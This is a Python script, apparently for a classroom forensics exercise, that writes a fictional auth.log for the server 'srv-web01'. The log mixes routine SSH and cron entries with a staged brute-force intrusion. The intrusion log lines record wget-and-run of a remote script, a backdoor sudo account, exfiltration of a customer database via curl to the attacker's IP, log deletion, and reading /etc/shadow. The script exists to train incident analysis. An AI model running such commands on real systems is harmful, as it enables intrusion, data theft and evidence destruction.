#!/usr/bin/env python3
"""
Gera um arquivo auth.log FICTÍCIO do servidor "srv-web01" da empresa
"LojaFecaf" contendo tráfego normal + um incidente de segurança.

Uso:  python3 gerar_logs.py          -> cria ./auth.log
O conteúdo é determinístico (seed fixa): todos os alunos recebem o mesmo log.
"""
import random
from datetime import datetime, timedelta

random.seed(2026)
HOST = "srv-web01"
linhas = []  # (datetime, texto)


def add(dt, processo, msg):
    linhas.append((dt, f"{processo}: {msg}"))


def pid():
    return random.randint(1000, 39999)


def porta():
    return random.randint(32768, 60999)


inicio = datetime(2026, 11, 9, 0, 0, 0)
fim = datetime(2026, 11, 11, 23, 59, 0)

# ------------------------------------------------------------------ ruído normal
usuarios_legitimos = {
    "maria": "10.0.0.23",
    "joao": "10.0.0.31",
    "deploy": "10.0.0.5",
    "carla": "10.0.0.44",
}

t = inicio
while t < fim:
    # CRON a cada ~10 min
    p = pid()
    add(t, f"CRON[{p}]", "pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)")
    add(t + timedelta(seconds=1), f"CRON[{p}]", "pam_unix(cron:session): session closed for user root")
    t += timedelta(minutes=10, seconds=random.randint(0, 30))

# logins legítimos em horário comercial
dia = inicio
while dia < fim:
    for user, ip in usuarios_legitimos.items():
        for _ in range(random.randint(1, 3)):
            h = dia + timedelta(hours=random.randint(8, 18), minutes=random.randint(0, 59),
                                seconds=random.randint(0, 59))
            p = pid()
            metodo = "publickey" if user in ("deploy", "joao") else "password"
            add(h, f"sshd[{p}]", f"Accepted {metodo} for {user} from {ip} port {porta()} ssh2")
            add(h, f"sshd[{p}]", f"pam_unix(sshd:session): session opened for user {user}(uid=100{len(user)}) by (uid=0)")
            if user == "maria":
                add(h + timedelta(minutes=3), "sudo", f"   maria : TTY=pts/1 ; PWD=/home/maria ; USER=root ; COMMAND=/usr/bin/systemctl restart apache2")
            if user == "deploy":
                add(h + timedelta(minutes=1), "sudo", f"  deploy : TTY=pts/2 ; PWD=/var/www/app ; USER=root ; COMMAND=/usr/bin/git pull")
            add(h + timedelta(minutes=random.randint(5, 90)), f"sshd[{p}]", f"pam_unix(sshd:session): session closed for user {user}")
    dia += timedelta(days=1)

# carla erra a senha 3 vezes (comportamento humano normal)
h = datetime(2026, 11, 10, 9, 2, 10)
for i in range(3):
    add(h + timedelta(seconds=i * 9), f"sshd[{pid()}]", f"Failed password for carla from 10.0.0.44 port {porta()} ssh2")
add(h + timedelta(seconds=40), f"sshd[{pid()}]", f"Accepted password for carla from 10.0.0.44 port {porta()} ssh2")

# ------------------------------------------------------------------ distrator: scanner que NÃO teve sucesso
SCANNER = "45.155.205.233"
h = datetime(2026, 11, 9, 14, 30, 0)
for i in range(30):
    add(h + timedelta(seconds=i * 4), f"sshd[{pid()}]", f"Failed password for root from {SCANNER} port {porta()} ssh2")
add(h + timedelta(seconds=125), f"sshd[{pid()}]", f"Disconnecting authenticating user root {SCANNER} port {porta()}: Too many authentication failures [preauth]")

# ------------------------------------------------------------------ INCIDENTE
ATACANTE = "185.220.101.47"
h = datetime(2026, 11, 10, 2, 13, 2)
dicionario = ["admin", "test", "oracle", "ubuntu", "user", "guest", "postgres", "ftpuser",
              "pi", "git", "mysql", "www", "backup", "dev", "teste", "administrador"]
# 48 tentativas com usuários inexistentes (3 rodadas no dicionário)
for i in range(48):
    u = dicionario[i % len(dicionario)]
    add(h, f"sshd[{pid()}]", f"Invalid user {u} from {ATACANTE} port {porta()}")
    add(h + timedelta(seconds=1), f"sshd[{pid()}]", f"Failed password for invalid user {u} from {ATACANTE} port {porta()} ssh2")
    h += timedelta(seconds=5)

# 37 tentativas contra o usuário válido "suporte"
for i in range(37):
    add(h, f"sshd[{pid()}]", f"Failed password for suporte from {ATACANTE} port {porta()} ssh2")
    h += timedelta(seconds=4)

# Sucesso!
sucesso = datetime(2026, 11, 10, 2, 22, 7)
ps = 31337
add(sucesso, f"sshd[{ps}]", f"Accepted password for suporte from {ATACANTE} port 44123 ssh2")
add(sucesso, f"sshd[{ps}]", "pam_unix(sshd:session): session opened for user suporte(uid=1007) by (uid=0)")

pos = [
    (2, 3, "COMMAND=/usr/bin/id"),
    (2, 51, f"COMMAND=/usr/bin/wget http://{ATACANTE}/x.sh -O /tmp/x.sh"),
    (3, 20, "COMMAND=/usr/bin/bash /tmp/x.sh"),
    (5, 2, "COMMAND=/usr/sbin/useradd -m -s /bin/bash sysupdate"),
    (5, 30, "COMMAND=/usr/sbin/usermod -aG sudo sysupdate"),
    (7, 12, "COMMAND=/usr/bin/crontab -l"),
    (8, 40, "COMMAND=/usr/bin/tar czf /tmp/.cache.tgz /var/www/app/db/clientes.sql"),
    (11, 5, f"COMMAND=/usr/bin/curl -T /tmp/.cache.tgz http://{ATACANTE}/upload"),
    (14, 47, "COMMAND=/usr/bin/rm -f /var/log/apache2/access.log"),
]
for mm, ss, cmd in pos:
    add(sucesso + timedelta(minutes=mm, seconds=ss), "sudo",
        f" suporte : TTY=pts/0 ; PWD=/home/suporte ; USER=root ; {cmd}")
add(sucesso + timedelta(minutes=5, seconds=2), f"useradd[{pid()}]",
    "new user: name=sysupdate, UID=1008, GID=1008, home=/home/sysupdate, shell=/bin/bash, from=/dev/pts/0")
add(sucesso + timedelta(minutes=5, seconds=30), f"usermod[{pid()}]", "add 'sysupdate' to group 'sudo'")
add(sucesso + timedelta(minutes=19, seconds=33), f"sshd[{ps}]", "pam_unix(sshd:session): session closed for user suporte")

# backdoor usada no dia seguinte
h = datetime(2026, 11, 11, 3, 5, 44)
p = pid()
add(h, f"sshd[{p}]", f"Accepted password for sysupdate from {ATACANTE} port {porta()} ssh2")
add(h, f"sshd[{p}]", "pam_unix(sshd:session): session opened for user sysupdate(uid=1008) by (uid=0)")
add(h + timedelta(minutes=2), "sudo", "sysupdate : TTY=pts/0 ; PWD=/home/sysupdate ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow")
add(h + timedelta(minutes=6), f"sshd[{p}]", "pam_unix(sshd:session): session closed for user sysupdate")

# ------------------------------------------------------------------ grava
linhas.sort(key=lambda x: x[0])
with open("auth.log", "w", encoding="utf-8") as f:
    for dt, txt in linhas:
        f.write(f"{dt.strftime('%b %d %H:%M:%S')} {HOST} {txt}\n")

print(f"auth.log gerado com {len(linhas)} linhas.")
